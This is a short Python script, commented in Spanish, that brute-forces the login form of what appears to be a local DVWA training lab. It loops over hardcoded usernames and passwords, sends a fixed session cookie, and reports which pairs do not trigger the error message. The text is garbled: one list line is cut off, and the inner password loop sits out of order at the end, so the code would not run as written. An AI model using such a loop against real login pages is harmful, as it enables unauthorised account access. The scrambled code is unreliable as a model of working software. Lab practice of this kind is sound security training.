import requests
import time
inicio = time.time()
# Configuración
url = "http://127.0.0.1:8080/vulnerabilities/brute/"
cookie_sesion = "50gbqt2knlcj0697pslp6kphj2"

headers = {
    "Cookie": f"security=low; PHPSESSID={cookie_sesion}",
    "User-Agent": "Mozilla/5.0 (Python requests script)"
}

usuarios = ["admin", "polvorin", "toto", "pablo", "simon", "neko"]
contrasenas = ["password", "abc123", "charlycharly", "950003", "letmein>

texto_error = "Username and/or password incorrect."

pares_validos = []

for user in usuarios:
if texto_error not in respuesta.text:
            print(f"[+] Par válido encontrado: {user} / {pw}")
            pares_validos.append((user, pw))
        else:
            print(f"[-] Intento fallido: {user} / {pw}")

        time.sleep(0.2)

print("\n--- Resumen ---")
print(f"Pares válidos encontrados: {len(pares_validos)}")
for par in pares_validos:
    print(f"Usuario: {par[0]} - Contraseña: {par[1]}")
fin = time.time()
print(f"\nTiempo total: {fin - inicio:.2f} segundos")

    for pw in contrasenas:
        params = {
            "username": user,
            "password": pw,
            "Login": "Login"
        }
        respuesta = requests.get(url, params=params, headers=headers)

